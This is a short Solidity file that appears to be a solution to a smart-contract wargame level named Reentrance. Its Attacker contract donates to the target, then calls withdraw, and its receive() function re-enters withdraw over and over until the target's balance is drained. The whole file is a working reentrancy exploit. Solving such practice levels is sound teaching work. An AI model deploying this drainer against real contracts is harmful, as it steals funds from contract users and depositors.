// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;
import "@levels/Reentrance.sol";

contract Attacker {
    Reentrance public target;

    constructor(address _target) payable {
        target = Reentrance(payable(_target));
    }

    receive() external payable {
        if (address(target).balance >= target.balanceOf(address(this))) {
            target.withdraw(target.balanceOf(address(this)));
        } else if (address(target).balance > 0) {
            target.withdraw(address(target).balance);
        }
    }

    function exploit() public payable {
        target.donate{value: address(this).balance}(address(this));
        target.withdraw(target.balanceOf(address(this)));
    }
}
